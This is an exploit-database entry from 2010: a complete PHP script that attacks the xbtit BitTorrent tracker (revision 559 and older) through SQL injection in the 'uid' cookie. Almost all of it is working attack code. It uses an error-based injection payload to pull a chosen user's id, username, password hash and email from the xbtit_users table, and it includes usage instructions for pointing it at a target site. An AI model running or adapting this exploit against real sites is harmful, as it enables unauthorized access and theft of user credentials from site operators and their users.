# Exploit Title: xBtiTracker Remote SQL Injection Vulnerability
# Date: 10.04.2010
# Author: InATeam (http://inattack.ru/) via Dominus
# Software Link: http://www.btiteam.org/
# Version: xbtit v.2.0.0 - revision 559 and older
# Tested on: xbtit v.2.0.0 - revision 559
# Code :
 
 
&lt;?php
 
$id = $argv[&#039;2&#039;];
$name = $argv[&#039;3&#039;];
$site = $argv[&#039;1&#039;];
if(isset($argv[&#039;3&#039;])) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch, CURLOPT_COOKIE, &quot;uid=$id+or+(1,1)=(select+count(0),concat((select+concat_ws(0x3a,id,username,password,email, 0x3a3a3a)+from+xbtit_users+where+username=&#039;$name&#039;),floor(rand(0)*2))from(information_schema.tables)group+by+2);&quot;);
$result = curl_exec($ch);
preg_match(&quot;/(\d+:.*:[\w\d]{32}:.*):::/i&quot;, $result, $match);
printf(&quot;\nResult: %s\n&quot;, $match[&#039;1&#039;]);
}
else {
print(&quot;====================================\n
Usage: php btit.php URL ID UserName\n
Example: php btit.php http://site.com/ 2 admin\n
====================================\n&quot;);
}
